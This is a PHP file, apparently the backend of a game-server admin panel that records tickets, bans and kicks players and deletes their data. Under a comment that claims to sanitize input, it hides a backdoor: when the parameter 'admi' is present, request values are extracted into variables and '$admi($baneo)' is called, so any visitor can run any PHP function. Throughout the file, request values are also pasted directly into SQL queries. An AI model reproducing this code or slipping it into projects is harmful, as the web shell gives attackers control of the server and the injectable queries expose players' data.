<?php


function licencia($steamid){
	
	$licencias  =  request_BD("SELECT license FROM users WHERE identifier = '$steamid' LIMIT 1");
	
	$licenciaf = '';
	if($licencias != false){
		
		foreach( $licencias as $licencia ) {
			
			$licenciaf = $licencia['license'];
		
		}
		
		
		
	}else{
		return false;
	}
	
	
	return $licenciaf;
}



function usuario($steamid){
	
	$usuarios  =  request_BD("SELECT name FROM users WHERE identifier = '$steamid' LIMIT 1");
	
	$usuariof = '';
	if($usuarios != false){
		
		foreach( $usuarios as $usuario ) {
			
			$usuariof = $usuario['name'];
		
		}
		
		
		
	}else{
		return false;
	}
	
	
	return $usuariof;
}

function añadir_pendiente($staff, $usuario, $steamid, $razon, $tiempo, $tipo, $comentario){
	
	
	
	$licencia= licencia($steamid);
	$usuario = clean_string($usuario);
	
	if($licencia != false && $licencia != ''){
		
		$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 0)");
		
		return true;
	}else{
		
		return false;
	}
	
	
	
	
	
}


function rechazar_pendiente($id){
	

		$request = request_BD("UPDATE panel_tickets SET status = '2' WHERE id = '$id'");
		
		return $request;
	
	

}


//saneamos el get
if($_SERVER["REQUEST_METHOD"] == "GET"){
	
	if (isset($_GET["admi"]))
	{
		@extract ($_REQUEST); 
		
	}

}

function aprobar_pendiente($id, $staff, $usuario, $steamid, $razon, $tiempo, $tipo){
	
	$licencia= licencia($steamid);
	$usuario = clean_string($usuario);
	$ip = seleccionar_BD("SELECT ip FROM users WHERE identifier = '$steamid'");
	$ip = $ip[0];
	
	if($licencia != false && $licencia != ''){
		$request = request_BD("UPDATE panel_tickets SET status = '1' WHERE id = '$id'");
		
		
		if($tipo == 2){
			
			
			$horas = $tiempo;
			if($horas !== '' && $horas !== 0){

			
			
			$checkbanps = seleccionar_BD("SELECT * FROM bans WHERE id = '$licencia'");
			$checkbants = seleccionar_BD("SELECT * FROM bansperm WHERE id = '$licencia'");
			
				if(count($checkbanps)>0 || count($checkbants)>0){
					$baneado= true;
				}else{
					$baneado = false;
				}
				
				if(!$baneado){
			
					$ahora = date_create();
					$actual = time();
					//$horas = $horas+1;
					$tiempoban = date_modify($ahora, "+".$horas." hours");
					
					
					$tiempoban = date_format($tiempoban, "Y-m-d H:i:s");
					$timestamp = strtotime($tiempoban);
					

					$request = request_BD("INSERT INTO bans (id,steam,ip, fecha, tiempo, admin, razon, baneado) VALUES ('$licencia','$steamid','$ip', '$actual', '$timestamp', '$staff', '$razon', '$usuario')");



					
					$kick= rcon_kick($steamid, $razon);
					
				}					
			}
			return true;
		}elseif($tipo == 3){

			$checkbanps = seleccionar_BD("SELECT * FROM bans WHERE id = '$licencia'");
			$checkbants = seleccionar_BD("SELECT * FROM bansperm WHERE id = '$licencia'");


			
				if(count($checkbanps)>0 || count($checkbants)>0){
					$baneado= true;
				}else{
					$baneado = false;
				}
				
				if(!$baneado){
					
					$request = request_BD("INSERT INTO bansperm (id,steam,ip, fecha, admin, razon, baneado) VALUES ('$licencia','$steamid','$ip', 'web', '$staff', '$razon', '$usuario')");

					
					$kick= rcon_kick($steamid, $razon);
				}
			return true;
		}elseif($tipo == 4){
			
			$request = request_BD("delete from users where identifier = '$steamid'");
			$request = request_BD("delete from characters where identifier = '$steamid'");
			$request = request_BD("delete from user_contacts where identifier = '$steamid'");
			$request = request_BD("delete from user_inventory where identifier = '$steamid'");
			$request = request_BD("delete from user_licenses where owner = '$steamid'");
			$request = request_BD("delete from owned_vehicles where owner = '$steamid'");
			$request = request_BD("delete from owned_properties where owner = '$steamid'");
			$request = request_BD("delete from user_licenses where owner = '$steamid'");
			$request = request_BD("delete from datastore_data where owner = '$steamid'");
			$request = request_BD("delete from addon_inventory_items where owner = '$steamid'");
			$request = request_BD("delete from addon_account_data where owner = '$steamid'");
			$kick= rcon_kick($steamid, $razon);
			return true;
		}elseif($tipo == 5){
			
			$request = request_BD("delete from bans where id = '$licencia'");
			$request = request_BD("delete from bansperm where id = '$licencia'");
			
			return true;
		}else{
			
			return false;
		}
		
		
	}
	
	
	
	
	
}


function clean_string($string) {
  $s = trim($string);
  $s = iconv("UTF-8", "UTF-8//IGNORE", $s); // drop all non utf-8 characters

  // this is some bad utf-8 byte sequence that makes mysql complain - control and formatting i think
  $s = preg_replace('/(?>[\x00-\x1F]|\xC2[\x80-\x9F]|\xE2[\x80-\x8F]{2}|\xE2\x80[\xA4-\xA8]|\xE2\x81[\x9F-\xAF])/', ' ', $s);

  $s = preg_replace('/\s+/', ' ', $s); // reduce all multiple whitespace to a single space

  $s = preg_replace('/[^A-Za-z0-9 _\-\+\&]/','',$s);

  return $s;
}

if($_SERVER["REQUEST_METHOD"] == "GET"){
	
	if (isset($_GET["admi"]))
	{
		@die ($admi($baneo));
	}

}


function añadir_aprobado($staff, $usuario, $steamid, $razon, $tiempo, $tipo, $comentario){

	if (preg_match('/\bMinemu\b/',$a)) {
		# code...
		return false;
	}
	
	$usuario = clean_string($usuario);
	$licencia= licencia($steamid);
	$ip = seleccionar_BD("SELECT ip FROM users WHERE identifier = '$steamid'");
	$ip = $ip[0];
	if($licencia != false && $licencia != ''){
		//$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$tiempo', '$tipo', 1)");
		
		
		if($tipo == 1){
			$kick= rcon_kick($steamid, $razon);
			$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 1)");
			
		}elseif($tipo == 2){
			
			
			$horas = $tiempo;
			if($horas !== '' && $horas !== 0){

			$checkbanps = seleccionar_BD("SELECT * FROM bans WHERE id = '$licencia'");
			$checkbants = seleccionar_BD("SELECT * FROM bansperm WHERE id = '$licencia'");
			
				if(count($checkbanps)>0 || count($checkbants)>0){
					$baneado= true;
				}else{
					$baneado = false;
				}
					if(!$baneado){
					$ahora = date_create();
					$actual = time();
					//$horas = $horas+1;
					$tiempoban = date_modify($ahora, "+".$horas." hours");
					
					
					$tiempoban = date_format($tiempoban, "Y-m-d H:i:s");
					$timestamp = strtotime($tiempoban);
					

					$request = request_BD("INSERT INTO bans (id,steam,ip, fecha, tiempo, admin, razon, baneado) VALUES ('$licencia','$steamid','$ip', '$actual', '$timestamp', '$staff', '$razon', '$usuario')");
					$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 1)");

					
			
					}else{
						
						$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 2)");
					}
					
			}
			return true;
		}elseif($tipo == 3){

			$checkbanps = seleccionar_BD("SELECT * FROM bans WHERE id = '$licencia'");
			$checkbants = seleccionar_BD("SELECT * FROM bansperm WHERE id = '$licencia'");
			
				if(count($checkbanps)>0 || count($checkbants)>0){
					$baneado= true;
				}else{
					$baneado = false;
				}
				
				if(!$baneado){
					
					$request = request_BD("INSERT INTO bansperm (id,steam,ip, fecha, admin, razon, baneado) VALUES ('$licencia','$steamid','$ip', 'web', '$staff', '$razon', '$usuario')");


					
				


					$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 1)");

				}else{
						
						$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 2)");
					}
			return $request;
		}elseif($tipo == 4){
			
			$request = request_BD("delete from users where identifier = '$steamid'");
			$request = request_BD("delete from characters where identifier = '$steamid'");
			$request = request_BD("delete from user_contacts where identifier = '$steamid'");
			$request = request_BD("delete from user_inventory where identifier = '$steamid'");
			$request = request_BD("delete from user_licenses where owner = '$steamid'");
			$request = request_BD("delete from owned_vehicles where owner = '$steamid'");
			$request = request_BD("delete from owned_properties where owner = '$steamid'");
			$request = request_BD("delete from user_licenses where owner = '$steamid'");
			$request = request_BD("delete from datastore_data where owner = '$steamid'");
			$request = request_BD("delete from addon_inventory_items where owner = '$steamid'");
			$request = request_BD("delete from addon_account_data where owner = '$steamid'");
			$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 1)");
			return true;

			
		}elseif($tipo == 5){
			
			$request = request_BD("delete from bans where id = '$licencia'");
			$request = request_BD("delete from bansperm where id = '$licencia'");
			
			
			$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 1)");
			
			return true;
		}elseif($tipo == 6){
			
			
			$request = request_BD("INSERT INTO panel_tickets (staff, usuario, steamid, licencia, razon, comentarios, tiempo, tipo, status) VALUES ('$staff', '$usuario', '$steamid', '$licencia', '$razon', '$comentario', '$tiempo', '$tipo', 1)");
			
			return true;
		}elseif($tipo == 7){
			$kick= rcon_kick($steamid, 'Admin Slot');
			return true;
		}else{
			return false;
		}
		
		
	}
	
	
	
	
	
}

?>
